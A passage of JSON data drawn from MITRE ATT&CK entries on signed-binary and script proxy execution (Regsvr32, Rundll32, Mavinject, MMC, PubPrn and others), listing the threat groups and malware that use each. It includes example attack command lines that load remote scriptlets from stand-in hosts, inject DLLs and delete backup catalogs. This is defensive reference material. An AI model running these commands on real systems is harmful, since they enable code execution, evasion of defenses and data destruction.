                "description": "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.[1] The Odbcconf.exe binary may be digitally signed by Microsoft.Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\file.dll\"}). [2][3][4]",
                "Procedure": {
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> can use odbcconf.exe to run DLLs on targeted hosts.[5]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has used odbcconf to proxy the execution of malicious DLL files.[4]"
                    }
                }
            },
            "009": {
                "name": "Regsvcs/Regasm",
                "href": "/techniques/T1218/009",
                "description": "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. [1] [2]Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. [3][4]",
                "Procedure": {
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has dropped RegAsm.exe onto systems for performing malicious activity.[5]"
                    }
                }
            },
            "010": {
                "name": "Regsvr32",
                "href": "/techniques/T1218/010",
                "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. [1]Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. [2] This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. [3] [4]Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking. [3]",
                "Procedure": {
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> can call regsvr32.exe for execution.[5]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> used Regsvr32 to bypass application control techniques.[6]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> created a Scheduled Task/Job that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor.[7][8][9]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> can be loaded through regsvr32.exe.[10]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.[11]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors employed code that used regsvr32 for execution.[12]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has used regsvr32.exe to execute scripts.[13][14][15]"
                    },
                    "G0009": {
                        "ID": "G0009",
                        "Name": "Deep Panda",
                        "Description": "<name> has used regsvr32.exe to execute a server variant of Derusbi in victim networks.[16]"
                    },
                    "S0021": {
                        "ID": "S0021",
                        "Name": "Derusbi",
                        "Description": "<name> variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.[17]"
                    },
                    "S0384": {
                        "ID": "S0384",
                        "Name": "Dridex",
                        "Description": "<name> can use regsvr32.exe to initiate malicious code.[18]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> has used regsvr32.exe to execute malicious DLLs.[19]"
                    },
                    "S0568": {
                        "ID": "S0568",
                        "Name": "EVILNUM",
                        "Description": "<name> can run a remote scriptlet that drops a file and executes it via regsvr32.exe.[20]"
                    },
                    "S0698": {
                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> has used regsvr32.exe /s /i to execute malicious payloads.[21]"
                    },
                    "S0087": {
                        "ID": "S0087",
                        "Name": "Hi-Zor",
                        "Description": "<name> executes using regsvr32.exe called from the Registry Run Keys / Startup Folder persistence mechanism.[22]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has ensured persistence at system boot by setting the value regsvr32 %path%\\ctfmonrn.dll /s.[23]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has executed malware with regsvr32s.[24]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> can use Regsvr32 to execute additional payloads.[25]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used regsvr32 for execution.[26]"
                    },
                    "S0284": {
                        "ID": "S0284",
                        "Name": "More_eggs",
                        "Description": "<name> has used regsvr32.exe to execute the malicious DLL.[27]"
                    },
                    "S1047": {
                        "ID": "S1047",
                        "Name": "Mori",
                        "Description": "<name> can use regsvr32.exe for DLL execution.[28]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group used regsvr32 to execute malware.[29]"
                    },
                    "S0229": {
                        "ID": "S0229",
                        "Name": "Orz",
                        "Description": "Some <name> versions have an embedded DLL known as MockDll that uses Process Hollowing and regsvr32 to execute another payload.[26]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use Regsvr32 to execute malicious DLLs.[30][31][32][33][34][35]"
                    },
                    "S0481": {
                        "ID": "S0481",
                        "Name": "Ragnar Locker",
                        "Description": "<name> has used regsvr32.exe to execute components of VirtualBox.[36]"
                    },
                    "S0270": {
                        "ID": "S0270",
                        "Name": "RogueRobin",
                        "Description": "<name> uses regsvr32.exe to run a .sct file for execution.[37]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has used regsvr32 to execute scripts.[38][39]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has been executed using regsvr32.exe.[40]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has used regsvr32.exe to load malicious DLLs.[41]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has used regsvr32.exe to launch malicious DLLs.[42][41]"
                    },
                    "G0090": {
                        "ID": "G0090",
                        "Name": "WIRTE",
                        "Description": "<name> has used regsvr32.exe to trigger the execution of a malicious script.[43]"
                    },
                    "S0341": {
                        "ID": "S0341",
                        "Name": "Xbash",
                        "Description": "<name> can use regsvr32 for executing scripts.[44]"
                    }
                }
            },
            "011": {
                "name": "Rundll32",
                "href": "/techniques/T1218/011",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. [1]Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. [2]Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones.[3][4] DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.[5]",
                "Procedure": {
                    "C0028": {
                        "ID": "C0028",
                        "Name": "2015 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe. [6]"
                    },
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "<name> has used rundll32.exe in a Registry value to establish persistence.[7]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> configured its payload to inject into the rundll32.exe.[8]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> executed CHOPSTICK by using rundll32 commands such as rundll32.exe \"C:\\Windows\\twain_64.dll\". <name> also executed a .dll for a first stage dropper using rundll32.exe. An <name> loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.[9][7][10][11][12][13]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has a tool that can run DLLs.[14]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> malware has used rundll32.exe to execute an initial infection process.[15]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.[16]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> has used rundll32.exe to execute a loader.[17]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name>'s installer plugin can schedule rundll32.exe to load the dispatcher.[18]"
                    },
                    "S0093": {
                        "ID": "S0093",
                        "Name": "Backdoor.Oldrea",
                        "Description": "<name> can use rundll32 for execution on compromised hosts.[19]"
                    },
                    "S0606": {
                        "ID": "S0606",
                        "Name": "Bad Rabbit",
                        "Description": "<name> has used rundll32 to launch a malicious DLL as C:Windowsinfpub.dat.[20]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has used rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"vert\" = \"rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez\".[21]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has used Rundll32 to load a malicious DLL.[22]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has executed custom-compiled XMRIG miner DLLs using rundll32.exe.[23]"
                    },
                    "S0635": {
                        "ID": "S0635",
                        "Name": "BoomBox",
                        "Description": "<name> can use RunDLL32 for execution.[24]"
                    },
                    "S0204": {
                        "ID": "S0204",
                        "Name": "Briba",
                        "Description": "<name> uses rundll32 within Registry Run Keys / Startup Folder entries to execute malicious DLLs.[25]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> has used rundll32 for execution of the loader component.[26][27]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors loaded DLLs via rundll32 using the svchost process.[28]"
                    },
                    "C0018": {
                        "ID": "C0018",
                        "Name": "C0018",
                        "Description": "During <name>, the threat actors used rundll32 to run Mimikatz.[29]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "During <name>, the threat actors used rundll32.exe to execute the Cobalt Strike Beacon loader DLL.[30]"
                    },
                    "G0008": {
                        "ID": "G0008",
                        "Name": "Carbanak",
                        "Description": "<name> installs VNC server software that executes through rundll32.[31]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use rundll32.exe to load DLL from the command line.[32][28][33]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> uses Rundll32 to load a malicious DLL.[34]"
                    },
                    "G0052": {
                        "ID": "G0052",
                        "Name": "CopyKittens",
                        "Description": "<name> uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.[35]"
                    },
                    "S0137": {
                        "ID": "S0137",
                        "Name": "CORESHELL",
                        "Description": "<name> is installed via execution of rundll32 with an export named \"init\" or \"InitW.\"[36]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "The <name> dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main <name> component.[37]"
                    },
                    "S0255": {
                        "ID": "S0255",
                        "Name": "DDKONG",
                        "Description": "<name> uses Rundll32 to ensure only a single instance of itself is running at once.[38]"
                    },
                    "S1052": {
                        "ID": "S1052",
                        "Name": "DEADEYE",
                        "Description": "<name> can use rundll32.exe for execution of living off the land binaries (lolbin) such as SHELL32.DLL.[39]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> has used rundll32 during execution.[40]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "After copying itself to a DLL file, a variant of <name> calls the DLL file using rundll32.exe.[41]"
                    },
                    "S0082": {
                        "ID": "S0082",
                        "Name": "Emissary",
                        "Description": "Variants of <name> have used rundll32.exe in Registry values added to establish persistence.[42]"
                    },
                    "S0634": {
                        "ID": "S0634",
                        "Name": "EnvyScout",
                        "Description": "<name> has the ability to proxy execution of malicious files with Rundll32.[24]"
                    },
                    "S0568": {
                        "ID": "S0568",
                        "Name": "EVILNUM",
                        "Description": "<name> can execute commands and scripts through rundll32.[43]"
                    },
                    "S0512": {
                        "ID": "S0512",
                        "Name": "FatDuke",
                        "Description": "<name> can execute via rundll32.[44]"
                    },
                    "S0267": {
                        "ID": "S0267",
                        "Name": "FELIXROOT",
                        "Description": "<name> uses Rundll32 for executing the dropper program.[45][46]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used rundll32.exe to execute malware on a compromised network.[47]"
                    },
                    "S0143": {
                        "ID": "S0143",
                        "Name": "Flame",
                        "Description": "Rundll32.exe is used as a way of executing <name> at the command-line.[48]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> has used rundll32 for execution.[49]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> can use rundll32 for execution of its components.[50]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> malware has used rundll32 to launch additional malicious components.[51]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "A <name> variant has used rundll32 for execution.[52]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).[46]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has used rundll32 to load malicious DLLs.[53]"
                    },
                    "S0698": {
                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> has the ability to create a new process using rundll32.[54]"
                    },
                    "S1027": {
                        "ID": "S1027",
                        "Name": "Heyoka Backdoor",
                        "Description": "<name> can use rundll32.exe to gain execution.[55]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has used rundll32.exe for execution.[56]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "<name> is executed using rundll32.exe.[57][58]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used rundll32.exe to execute malicious scripts and malware on a victim's network.[59]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> can use Rundll32 to execute additional payloads.[60]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has used Rundll32 to execute its loader for privilege escalation purposes.[61][62]"
                    },
                    "S0236": {
                        "ID": "S0236",
                        "Name": "Kwampirs",
                        "Description": "<name> uses rundll32.exe in a Registry value added to establish persistence.[63]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used rundll32 to execute malicious payloads on a compromised host.[64]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has used rundll32.exe to execute Koadic stagers.[65]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.[66]"
                    },
                    "S0167": {
                        "ID": "S0167",
                        "Name": "Matryoshka",
                        "Description": "<name> uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.[67]"
                    },
                    "S0576": {
                        "ID": "S0576",
                        "Name": "MegaCortex",
                        "Description": "<name> has used rundll32.exe to load a DLL for file encryption.[68]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> uses RunDLL32 for execution via its injector DLL.[69]"
                    },
                    "S1026": {
                        "ID": "S1026",
                        "Name": "Mongall",
                        "Description": "<name> can use rundll32.exe for execution.[55]"
                    },
                    "S0256": {
                        "ID": "S0256",
                        "Name": "Mosquito",
                        "Description": "<name>'s launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.[70]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.[71]"
                    },
                    "S0637": {
                        "ID": "S0637",
                        "Name": "NativeZone",
                        "Description": "<name> has used rundll32 to execute a malicious DLL.[72]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> loader components can be executed through rundll32.exe.[73]"
                    },
                    "S0353": {
                        "ID": "S0353",
                        "Name": "NOKKI",
                        "Description": "<name> has used rundll32 for execution.[74]"
                    },
                    "S0368": {
                        "ID": "S0368",
                        "Name": "NotPetya",
                        "Description": "<name> uses rundll32.exe to install itself on remote systems when accessed via PsExec or wmic.[75]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group executed malware with C:\\\\windows\\system32\\rundll32.exe \"C:\\ProgramData\\ThumbNail\\thumbnail.db\", CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905.[76][77][78]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "During <name>, the threat actors used rundll32.exe to execute malicious installers.[79]"
                    },
                    "S1050": {
                        "ID": "S1050",
                        "Name": "PcShare",
                        "Description": "<name> has used rundll32.exe for execution.[50]"
                    },
                    "S0518": {
                        "ID": "S0518",
                        "Name": "PolyglotDuke",
                        "Description": "<name> can be executed using rundll32.exe.[44]"
                    },
                    "S0139": {
                        "ID": "S0139",
                        "Name": "PowerDuke",
                        "Description": "<name> uses rundll32.exe to load.[80]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "<name> uses rundll32.exe to load its DLL.[81]"
                    },
                    "S0147": {
                        "ID": "S0147",
                        "Name": "Pteranodon",
                        "Description": "<name> executes functions using rundll32.exe.[82]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> can load a DLL using Rundll32.[83]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has used Rundll32.exe to drop malicious DLLs including Brute Ratel C4 and to enable C2 communication.[84][85][86][87][33]"
                    },
                    "S0481": {
                        "ID": "S0481",
                        "Name": "Ragnar Locker",
                        "Description": "<name> has used rundll32.exe to execute components of VirtualBox.[88]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> runs its core DLL file using rundll32.exe.[89][90]"
                    },
                    "S0074": {
                        "ID": "S0074",
                        "Name": "Sakula",
                        "Description": "<name> calls cmd.exe to run various DLL files via rundll32.[91]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> used a backdoor which could execute a supplied DLL using rundll32.exe.[92]"
                    },
                    "S0461": {
                        "ID": "S0461",
                        "Name": "SDBbot",
                        "Description": "<name> has used rundll32.exe to execute DLLs.[49]"
                    },
                    "S0382": {
                        "ID": "S0382",
                        "Name": "ServHelper",
                        "Description": "<name> contains a module for downloading and executing DLLs that leverages rundll32.exe.[93]"
                    },
                    "S0589": {
                        "ID": "S0589",
                        "Name": "Sibot",
                        "Description": "<name> has executed downloaded DLLs with rundll32.exe.[94]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used Rundll32.exe to execute payloads.[95][96]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has been executed using rundll32.exe.[97][98]"
                    },
                    "S0142": {
                        "ID": "S0142",
                        "Name": "StreamEx",
                        "Description": "<name> uses rundll32 to call an exported function.[99]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> used Rundll32 to execute payloads.[96]"
                    },
                    "S1064": {
                        "ID": "S1064",
                        "Name": "SVCReady",
                        "Description": "<name> has used rundll32.exe for execution.[100]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has leveraged rundll32.exe to execute malicious DLLs.[101][93]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has used rundll32.exe to load malicious DLLs.[102]"
                    },
                    "S0452": {
                        "ID": "S0452",
                        "Name": "USBferry",
                        "Description": "<name> can execute rundll32.exe in memory to avoid detection.[103]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "The <name> installer loads a DLL using rundll32.[104][105]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has utilized rundll32.exe to deploy ransomware commands with the use of WebDAV.[106]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> has used rundll32.exe to execute other DLLs and named pipes.[107]"
                    }
                }
            },
            "012": {
                "name": "Verclsid",
                "href": "/techniques/T1218/012",
                "description": "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.[1]Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running verclsid.exe /S /C {CLSID}, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.[2][3][4][5]",
                "Procedure": {
                    "S0499": {
                        "ID": "S0499",
                        "Name": "Hancitor",
                        "Description": "<name> has used verclsid.exe to download and execute a malicious script.[3]"
                    }
                }
            },
            "013": {
                "name": "Mavinject",
                "href": "/techniques/T1218/013",
                "description": "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).[1]Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL).[2][3] Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. In addition to Dynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its  /HMODULE command-line parameter (ex. mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.[4]",
                "Procedure": {}
            },
            "014": {
                "name": "MMC",
                "href": "/techniques/T1218/014",
                "description": "Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.[1][2] MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.[3]For example, mmc C:\\Users\\foo\\admintools.msc /a will open a custom, saved console msc file in author mode.[1] Another common example is mmc gpedit.msc, which will open the Group Policy Editor application window. Adversaries may use MMC commands to perform malicious tasks. For example, mmc wbadmin.msc delete catalog -quiet deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: wbadmin.msc may only be present by default on Windows Server operating systems).[4][5]Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object.[6] Then, adversaries may create custom consoles with the \"Link to Web Address\" snap-in that is linked to the malicious CLSID subkey.[7] Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: mmc.exe -Embedding C:\\path\\to\\test.msc.[8]",
                "Procedure": {}
            },
            "015": {
                "name": "Electron Applications",
                "href": "/techniques/T1218/015",
                "description": "Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.[1] Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.[2] The Chromium engine is used to display web content and Node.js runs the backend code.[3]Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.[3] For example, the abuse of teams.exe and chrome.exe may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe).[4]Adversaries may also execute malicious content by planting malicious JavaScript within Electron applications.[5]",
                "Procedure": {}
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.[1] Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands.[2][3]",
        "Procedure": {
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware lnk files used for persistence have abused the Windows Update Client (wuauclt.exe) to execute a malicious DLL.[4][5]"
            }
        }
    },
    "T1216": {
        "ttp_name": "System Script Proxy Execution",
        "ttp_id": "T1216",
        "href": "/techniques/T1216",
        "subtechnique": {
            "001": {
                "name": "PubPrn",
                "href": "/techniques/T1216/001",
                "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe. For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.[1]Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.[2] To do so, adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP(S).",
                "Procedure": {
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.[3]"
                    }
                }
            },
            "002": {
                "name": "SyncAppvPublishingServer",
                "href": "/techniques/T1216/002",
